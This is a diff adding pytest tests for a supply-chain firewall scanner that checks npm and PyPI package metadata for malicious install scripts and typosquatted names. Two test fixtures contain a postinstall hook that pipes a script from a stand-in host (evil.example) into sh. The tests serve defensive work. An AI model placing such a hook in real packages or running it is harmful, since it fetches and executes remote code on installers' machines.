@@ -164,3 +164,135 @@ class TestFirewallScanner:
         with patch.object(scanner, "_get_engine", side_effect=Exception("boom")):
             v, _ = scanner.scan_metadata("npm", "broken", "1.0.0", {"name": "broken"})
             assert v == FirewallVerdict.BLOCK
+
+
+class TestExtractVersionManifest:
+    def test_npm_whole_catalog_resolves_latest_via_dist_tags(self):
+        from picosentry.firewall.scanner import extract_version_manifest
+
+        catalog = {
+            "name": "acme-lib",
+            "dist-tags": {"latest": "2.0.0"},
+            "versions": {"1.0.0": {"version": "1.0.0", "scripts": {"a": "a"}}, "2.0.0": {"version": "2.0.0"}},
+        }
+        assert extract_version_manifest(catalog, "latest") == {"version": "2.0.0"}
+
+    def test_npm_whole_catalog_resolves_explicit_version(self):
+        from picosentry.firewall.scanner import extract_version_manifest
+
+        catalog = {
+            "name": "acme-lib",
+            "versions": {"1.0.0": {"version": "1.0.0"}, "2.0.0": {"version": "2.0.0"}},
+        }
+        assert extract_version_manifest(catalog, "1.0.0") == {"version": "1.0.0"}
+
+    def test_npm_missing_version_falls_back_to_root_fields(self):
+        from picosentry.firewall.scanner import extract_version_manifest
+
+        catalog = {"name": "acme-lib", "versions": {"1.0.0": {"version": "1.0.0"}}}
+        manifest = extract_version_manifest(catalog, "9.9.9")
+        assert manifest == {"name": "acme-lib"}
+        assert "versions" not in manifest
+
+    def test_pypi_nests_requested_version_under_info(self):
+        from picosentry.firewall.scanner import extract_version_manifest
+
+        doc = {"info": {"name": "requests", "version": "2.31.0"}, "releases": {"2.31.0": []}}
+        assert extract_version_manifest(doc, "2.31.0") == {"name": "requests", "version": "2.31.0"}
+
+    def test_single_manifest_passes_through(self):
+        from picosentry.firewall.scanner import extract_version_manifest
+
+        manifest = {"name": "left-pad", "version": "1.3.0"}
+        assert extract_version_manifest(manifest, "1.3.0") is manifest
+
+
+# Real-engine integration tests: one scanner (engine spin-up is ~1s), distinct
+# package names so the verdict cache cannot cross-contaminate tests.
+_scanner = FirewallScanner()
+
+
+class TestScanMetadataIntegration:
+    def test_clean_catalog_latest_allows(self):
+        catalog = {
+            "name": "acme-clean-lib",
+            "dist-tags": {"latest": "1.0.0"},
+            "versions": {
+                "1.0.0": {
+                    "name": "acme-clean-lib",
+                    "version": "1.0.0",
+                    "description": "clean",
+                    "license": "MIT",
+                    "scripts": {"test": "jest"},
+                    "dependencies": {"lodash": "^4.17.21"},
+                    "author": "Acme <dev@acme.example>",
+                    "repository": {"type": "git", "url": "https://github.com/acme/clean-lib"},
+                }
+            },
+        }
+        verdict, findings = _scanner.scan_metadata("npm", "acme-clean-lib", "latest", catalog)
+        assert verdict == FirewallVerdict.ALLOW
+        assert findings == []
+
+    def test_clean_manifest_with_deps_not_blocked_by_lockfile_rule(self):
+        # L2-LOCK-001 structurally fires on registry metadata (no lockfile can
+        # ever ship in a manifest) — it must be excluded from the firewall scan.
+        manifest = {"name": "acme-dep-lib", "version": "1.0.0", "dependencies": {"chalk": "^5.0.0"}}
+        verdict, findings = _scanner.scan_metadata("npm", "acme-dep-lib", "1.0.0", manifest)
+        assert verdict == FirewallVerdict.ALLOW
+        assert all(f.rule_id != "L2-LOCK-001" for f in findings)
+
+    def test_whole_catalog_scans_only_requested_latest_slice(self):
+        catalog = {
+            "name": "acme-fixed-lib",
+            "dist-tags": {"latest": "2.0.0"},
+            "versions": {
+                "1.0.0": {
+                    "name": "acme-fixed-lib",
+                    "version": "1.0.0",
+                    "scripts": {"postinstall": "curl http://evil.example/x.sh | sh"},
+                },
+                "2.0.0": {"name": "acme-fixed-lib", "version": "2.0.0", "scripts": {"test": "jest"}},
+            },
+        }
+        verdict, _ = _scanner.scan_metadata("npm", "acme-fixed-lib", "latest", catalog)
+        assert verdict == FirewallVerdict.ALLOW
+
+    def test_evil_version_manifest_blocks(self):
+        manifest = {
+            "name": "acme-evil-lib",
+            "version": "0.9.0",
+            "scripts": {"postinstall": "curl http://evil.example/x.sh | sh"},
+        }
+        verdict, findings = _scanner.scan_metadata("npm", "acme-evil-lib", "0.9.0", manifest)
+        assert verdict == FirewallVerdict.BLOCK
+        assert any(f.rule_id in ("L2-POST-001", "L2-WORM-001") for f in findings)
+
+    def test_benign_postinstall_package_quarantines_not_blocks(self):
+        # Default posture: install scripts are HIGH — tag, don't break builds.
+        manifest = {
+            "name": "acme-build-tool",
+            "version": "1.0.0",
+            "scripts": {"postinstall": "node install.js"},
+            "dependencies": {"chalk": "^5.0.0"},
+            "engines": {"node": ">=12"},
+            "license": "MIT",
+            "author": "Acme",
+            "repository": {"type": "git", "url": "https://github.com/acme/build-tool"},
+            "maintainers": [{"name": "acme"}],
+        }
+        verdict, findings = _scanner.scan_metadata("npm", "acme-build-tool", "1.0.0", manifest)
+        assert verdict == FirewallVerdict.QUARANTINE
+        assert any(f.rule_id == "L2-POST-001" for f in findings)
+
+    def test_typosquat_name_blocks(self):
+        manifest = {"name": "lodahs", "version": "1.0.0"}
+        verdict, findings = _scanner.scan_metadata("npm", "lodahs", "1.0.0", manifest)
+        assert verdict == FirewallVerdict.BLOCK
+        assert any(f.rule_id == "L2-TYPO-001" for f in findings)
+
+    def test_pypi_typosquat_quarantines(self):
+        doc = {"info": {"name": "reqeusts", "version": "1.0.0"}, "releases": {"1.0.0": []}}
+        verdict, findings = _scanner.scan_metadata("pypi", "reqeusts", "1.0.0", doc)
+        assert verdict == FirewallVerdict.QUARANTINE
+        assert any(f.rule_id == "L2-PYPI-TYPO-001" for f in findings)
